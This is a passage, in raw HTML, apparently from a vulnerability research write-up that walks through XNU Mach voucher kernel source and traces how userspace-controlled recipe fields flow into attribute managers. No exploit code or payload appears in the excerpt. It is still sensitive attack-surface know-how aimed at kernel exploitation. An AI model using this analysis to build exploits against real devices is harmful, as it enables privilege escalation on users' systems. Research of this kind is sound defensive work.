 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ipc_execute_voucher_recipe_command</span><span class="BGLtzooHlW-c2">(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;voucher</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sub_recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">key</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sub_recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">command</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;prev_iv</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sub_recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">content</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;sub_recipe</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">content_size</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;FALSE</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ipc_voucher_release</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">prev_iv</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">break</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">new_voucher </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;iv_dedup</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">voucher</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">else</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">new_voucher </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;IV_NULL</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_dealloc</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">voucher</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;FALSE</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>At the top of this snippet a new voucher is allocated in </span><span class="BGLtzooHlW-c11">iv_alloc</span><span>. </span><span class="BGLtzooHlW-c11">ipc_execute_voucher_recipe_command</span><span>&nbsp;is then called in a loop to consume however many sub-recipe structures were provided by userspace. Each sub-recipe can optionally refer to an existing voucher via the sub-recipe </span><span class="BGLtzooHlW-c11">previous_voucher</span><span>&nbsp;field. Note that MIG doesn&#39;t natively support variable-sized structures containing ports so it&#39;s passed as a mach port name which is looked up in the calling task&#39;s mach port namespace and converted to a voucher reference by </span><span class="BGLtzooHlW-c11">convert_port_name_to_voucher</span><span>. The intended functionality here is to be able to refer to </span><span class="BGLtzooHlW-c11">attrs</span><span class="BGLtzooHlW-c10">&nbsp;in other vouchers to copy or &quot;redeem&quot; them. As discussed, the semantics of redeeming a voucher attr isn&#39;t defined by the abstract voucher code and it&#39;s up to the individual attr managers to decide what that means.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Once the entire recipe has been consumed and all the </span><span class="BGLtzooHlW-c11">iv_table</span><span>&nbsp;entries filled in, </span><span class="BGLtzooHlW-c11">iv_dedup</span><span>&nbsp;then searches the </span><span class="BGLtzooHlW-c11">ivht_bucket</span><span>&nbsp;hash table to see if there&#39;s an existing voucher with a matching set of attributes. Remember that each attribute value stored in a voucher is an index into the attribute controller&#39;s attribute table; and those attributes are unique, so it suffices to simply compare the array of voucher indexes to determine whether all attribute values are equal. If a matching voucher is found, </span><span class="BGLtzooHlW-c11">iv_dedup</span><span>&nbsp;returns a reference to the existing voucher and calls </span><span class="BGLtzooHlW-c11">iv_dealloc</span><span>&nbsp;to free the newly created newly-created voucher. Otherwise, if no existing, matching voucher is found, </span><span class="BGLtzooHlW-c11">iv_dedup</span><span>&nbsp;adds the newly created voucher to the </span><span class="BGLtzooHlW-c11">ivht_bucket</span><span class="BGLtzooHlW-c10">&nbsp;hash table.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Let&#39;s look at </span><span class="BGLtzooHlW-c11">ipc_execute_voucher_recipe_command</span><span>&nbsp;which is responsible for filling in the requested entries in the voucher </span><span class="BGLtzooHlW-c11">iv_table</span><span>. Note that </span><span class="BGLtzooHlW-c11">key</span><span>&nbsp;and </span><span class="BGLtzooHlW-c11">command</span><span>&nbsp;are arbitrary, controlled dwords. </span><span class="BGLtzooHlW-c11">content</span><span>&nbsp;is a pointer to a buffer of controlled bytes, and </span><span class="BGLtzooHlW-c11">content_size</span><span class="BGLtzooHlW-c10">&nbsp;is the correct size of that input buffer. The MIG layer limits the overall input size of the recipe (which is a collection of sub-recipes) to 5260 bytes, and any input content buffers would have to fit in there.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.191bcb9f8d9273c881068813b7858079e6ae8a8c"></a><a id="t.15"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c3">&nbsp;kern_return_t</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">ipc_execute_voucher_recipe_command</span><span class="BGLtzooHlW-c2">(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ipc_voucher_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;voucher</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_attr_key_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;key</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_attr_recipe_command_t command</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; ipc_voucher_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;prev_iv</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_attr_content_t &nbsp; &nbsp; &nbsp; &nbsp;content</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; mach_voucher_attr_content_size_t &nbsp; content_size</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; boolean_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;key_priv</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_index_t prev_val_index</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; iv_index_t val_index</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; kern_return_t kr</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; </span><span class="BGLtzooHlW-c6">switch</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">command</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_USER_DATA_STORE</span><span class="BGLtzooHlW-c10">&nbsp;isn&#39;t one of the switch statement case values here so the code falls through to the default case:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.66c241fd41870ecdf298b20267a430a3c55fc901"></a><a id="t.16"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">default</span><span class="BGLtzooHlW-c2">:</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ipc_replace_voucher_value</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">voucher</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; key</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; command</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; prev_iv</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; content</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; content_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">break</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_SUCCESS</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Here&#39;s that code:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.2efb8ee4a6d79102545a6af1433eab60fcfedb02"></a><a id="t.17"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c3">&nbsp;kern_return_t</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">ipc_replace_voucher_value</span><span class="BGLtzooHlW-c2">(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ipc_voucher_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; voucher</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_key_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; key</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_recipe_command_t &nbsp; &nbsp; &nbsp;command</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ipc_voucher_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; prev_voucher</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_content_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; content</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_content_size_t &nbsp; &nbsp; &nbsp; &nbsp;content_size</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">...</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Get the manager for this key_index.</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Returns a reference on the control.</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; key_index </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;iv_key_to_index</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">key</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivgt_lookup</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">key_index</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;TRUE</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">ivam</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">IVAM_NULL </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;ivam</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;KERN_INVALID_ARGUMENT</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">..</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">iv_key_to_index</span><span>&nbsp;just subtracts 1 from key (assuming it&#39;s valid and not </span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATRR_KEY_ALL</span><span class="BGLtzooHlW-c10">):</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.bb233177f78d9071ef9e7fd9994b192f8d1f87d3"></a><a id="t.18"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">inline</span><span class="BGLtzooHlW-c3">&nbsp;iv_index_t</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">iv_key_to_index</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">mach_voucher_attr_key_t key</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">MACH_VOUCHER_ATTR_KEY_ALL </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;key </span><span class="BGLtzooHlW-c2">||</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;key</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;IV_UNUSED_KEYINDEX</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">iv_index_t</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">key </span><span class="BGLtzooHlW-c2">-</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">ivgt_lookup</span><span class="BGLtzooHlW-c10">&nbsp;then gets a reference on that key&#39;s attr manager and attr controller. The manager is really just a bunch of function pointers which define the semantics of what different &quot;key types&quot; actually mean; and the controller stores (and caches) values for those keys.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Let&#39;s keep reading </span><span class="BGLtzooHlW-c11">ipc_replace_voucher_value</span><span class="BGLtzooHlW-c10">. Here&#39;s the next statement:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.ab9235fa2555d8200bd62bdf3838f3a821ead649"></a><a id="t.19"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* save the current value stored in the forming voucher */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; save_val_index </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;iv_lookup</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">voucher</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;key_index</span><span class="BGLtzooHlW-c2">);</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>This point is important for getting a good feeling for how the voucher code is supposed to work; recipes can refer not only to other vouchers (via the </span><span class="BGLtzooHlW-c11">previous_voucher</span><span>&nbsp;port) but they can also refer to </span><span class="BGLtzooHlW-c17">themselves</span><span>&nbsp;during creation.</span><span>&nbsp;You don&#39;t have to have just one sub-recipe per attr type for which you wish to have a value in your voucher; you can specify multiple sub-recipes for that type. </span><span>Does it actually make any sense to do that? Well, luckily for the security researcher we don&#39;t have to worry about whether functionality actually makes any sense; it&#39;s all just a weird machine to us!</span><span class="BGLtzooHlW-c10">&nbsp;(There&#39;s allusions in the code to future functionality where attribute values can be &quot;layered&quot; or &quot;linked&quot; but for now such functionality doesn&#39;t exist.)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">iv_lookup</span><span>&nbsp;returns the &quot;value index&quot; for the given key in the particular voucher. That means it just returns the </span><span class="BGLtzooHlW-c11">iv_index_t</span><span>&nbsp;in the </span><span class="BGLtzooHlW-c11">iv_table</span><span class="BGLtzooHlW-c10">&nbsp;of the given voucher:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.18a23982f89054f9b506caa6cac52aa2dd16172b"></a><a id="t.20"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">inline</span><span class="BGLtzooHlW-c3">&nbsp;iv_index_t</span></p>
